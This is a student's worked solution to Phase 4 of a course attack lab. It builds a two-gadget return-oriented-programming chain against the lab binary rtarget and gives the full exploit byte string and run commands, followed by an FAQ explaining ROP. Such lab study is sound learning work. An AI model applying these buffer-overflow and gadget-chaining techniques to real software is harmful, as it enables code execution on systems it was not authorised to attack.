# 5.1 Level 2
For Phase 4, you will repeat the attack of Phase 2, but do so on program RTARGET using gadgets from your gadget farm. You can construct your solution using gadgets consisting of the following instruction types, and using only the first eight x86-64 registers (%rax–%rdi).

- movq : The codes for these are shown in Figure 3A.
- popq : The codes for these are shown in Figure 3B.
- ret : This instruction is encoded by the single byte 0xc3.
- nop : This instruction (pronounced “no op,” which is short for “no operation”) is encoded by the single byte 0x90. Its only effect is to cause the program counter to be incremented by 1.


## Some Advice:
- All the gadgets you need can be found in the region of the code for rtarget demarcated by the
functions start_farm and mid_farm.
- You can do this attack with just two gadgets.
- When a gadget uses a popq instruction, it will pop data from the stack. As a result, your exploit string will contain a combination of gadget addresses and data.


# References:

- https://github.com/magna25/Attack-Lab/blob/master/Phase%204.md



# Solution



in phase 2, we inject the exploit code into buffer and overwrite the return address to the start of the exploit code. then when return from getbuf, we can get to the exploit code address and execute the exploit code.
Now it is not easy to get the return address by  Address Space Layout Randomization (ASLR) and can not execute the exploit code by Non-executable memory (DEP) .
So we have to use buffer overflow vunerability to get the return address and execute the "gadget chains",


1. what will the exploit string look likefor phase 4?
from Advice 3 :  
When a gadget uses a popq instruction, it will pop data from the stack. your exploit string will contain a combination of gadget addresses and data.

getbuf stack frame after buffer overflow should be:
    touch2_address
    gadget2 address           -> ret in the end gadget1
00 00 00 00 59 b9 97 fa       -> cookie value (0x59b997fa)
    gadget1 address           -> return address for getbuf      
+-----------------------------+ <-- 高地址（栈底方向）
00 00 00 00 00 00 00 00                  	
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
+-----------------------------+ <-- 低地址 当前栈顶（%rsp 指向 buf 起始地址）

   1. when ret in getbuf 
      - pops an gadget1_address off the stack by %rsp
      - sets the PC to gadget1_address 
      - Jump to gadget1_address
   2. in gadget1_address,execute popq %rax
      - Read value at address given by %rsp
      - Store value at Dest (must be register)
      - Increment %rsp by 8
    3. when ret in gadget1_address
      - pops an gadget2_address off the stack by %rsp
      - sets the PC to gadget2_address 
      - Jump to gadget2_address
    4. in gadget2_address, execute movq %rax, %rdi
    5. when ret in gadget2_address
      - pops an touch2_address off the stack by %rsp
      - sets the PC to touch2_address 
      - Jump to touch2_address
   


2. what  the assembly instruction we will use?
The exploit we are doing is:

```asssembly
popq %register
movq %register %rdi
ret 
```


3. find 2 gadgets in rtarget.d for these assembly instructions?
```shell
# get the disassembly code of ctarget
objdump -d ctarget > ctarget.d
```

    | instruction| Byte| in gadget farm|
    |------------|------|----------------|
    | popq %rdi | 5f    |  N             |
    | popq %rax | 58    |  Y             |
    popq %rdi is given in the the pdf and it's byte representation is 5f, since we don't have 5f byte in the dump file, 
    we will look for a substitute which is popq %rax% with byte representation of 58

```assembly
00000000004019a7 <addval_219>:
  4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax
  4019ad:	c3                   	retq  
````
I found the above in the disassembled code and there might be more than one but take note of the address of 58, which will be used later.

the gadret1_address: 0x4019a7+0x4= 0x4019ab

The other instruction you need is: movq %rax %rdi and it's byte representation is 48 89 c7 c3 which is referenced in the pdf. Go back to your disassembled code and search for that byte code.

```asssembly
00000000004019a0 <addval_273>:
  4019a0:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax
  4019a6:	c3                   	retq  
```
the gadret2_address: 4019a0+0x2= 0x4019a2

Now you have 2 gadgets and can exploit the rtarget program.


4. construct the buffer overflow stack?

getbuf stack frame after buffer overflow should be:

00 00 00 00 00 40 17 ec
00 00 00 00 00 40 19 a2        gadget2 address -> ret in the end gadget1
00 00 00 00 59 b9 97 fa       -> cookie value (0x59b997fa)
00 00 00 00 00 40 19 ab         gadget1 address  -> return address for getbuf      
+-----------------------------+ <-- 高地址（栈底方向）
00 00 00 00 00 00 00 00                  	
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
+-----------------------------+ <-- 低地址 当前栈顶（%rsp 指向 buf 起始地址）


4. build the exploit string?

exploit4.d
(lower address)
```
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
ab 19 40 00 00 00 00 00 
fa 97 b9 59 00 00 00 00 
a2 19 40 00 00 00 00 00 
ec 17 40 00 00 00 00 00 
```
(high address)

   
```shell
# convert to raw bytes
cat exploit4.d | ./hex2raw > raw4.txt
./rtarget -q < raw4.txt
```



# GDB
```shell
```

# FAQs

1. what is return-oriented programming (ROP)?
   - The strategy with ROP is to identify byte sequences within an existing program that consist of one or more instructions followed by the instruction ret. Such a segment is referred to as a gadget. 
   - Instead of injecting new code, an attacker reuses existing pieces of code—called "gadgets"—already present in the program’s memory (typically in libraries or the executable)
   - When the program executes a ret instruction starting with this configuration, it will initiate a chain of gadget executions, with the ret instruction at the end of each gadget causing the program to jump to the beginning of the next.
   - A gadget can make use of code corresponding to assembly-language statements generated by the compiler, especially ones at the ends of functions.
   - with a byte-oriented instruction set, such as x86-64, a gadget can often be found by extracting patterns from other parts of the instruction byte sequence.
   - Modern systems implement protections like Data Execution Prevention (DEP) that mark certain regions of memory (e.g., the stack) as non-executable. ROP bypasses DEP because it does not inject new code; it reuses existing code that is already marked as executable.

2. what is gadget?
    - Gadgets are short sequences of machine instructions ending in a ret (return) instruction.
    - They are usually only a few bytes long.
    - An attacker chains these gadgets together to perform complex operations by carefully controlling the stack.

3. Stack Pivoting? 
    - The attacker manipulates the return addresses on the stack so that the control flow "returns" into a series of gadgets rather than the original function return.
    - This is done by overwriting a buffer (or some other control data) to place the addresses of gadgets in a sequence.

4. Hwo to Building a ROP Chain, execute a chain of gadget ?
    - The attacker carefully chooses gadgets that, when executed in sequence, perform the desired operations (e.g., calling functions, modifying registers).
    - The sequence of gadgets, or the ROP chain, is constructed by writing the gadget addresses onto the stack.
    - When the program returns from a function call, it “pops” the next gadget’s address off the stack, transferring control to that gadget.

    the steps of ret instruction:
    1. pops an address A off the stack 
    2. sets the PC to A.
    3. Jump to address
   

4. How ROP Works
    1. Finding Gadgets:
    Attackers analyze the target binary or libraries to find gadgets—sequences of instructions that perform useful actions (like moving data, arithmetic operations, or system calls).

    2. Controlling the Stack:

    - The attacker exploits a vulnerability (like a buffer overflow) to overwrite the stack.
    - The overwritten stack contains a series of gadget addresses followed by necessary data for the gadgets (e.g., parameters).
   
   1. Execution Flow:

    - When a function returns, it pops the first gadget address from the stack into the instruction pointer (RIP) and transfers execution to that gadget.
    - The gadget executes its instructions and then encounters a ret, which pops the next gadget address from the stack.
    - This process continues, effectively chaining multiple gadgets together to perform arbitrary computations or system calls.

5. How to identify useful gadgets in the gadget farm and use these to perform attacks similar to those you did in Phases 2 and 3?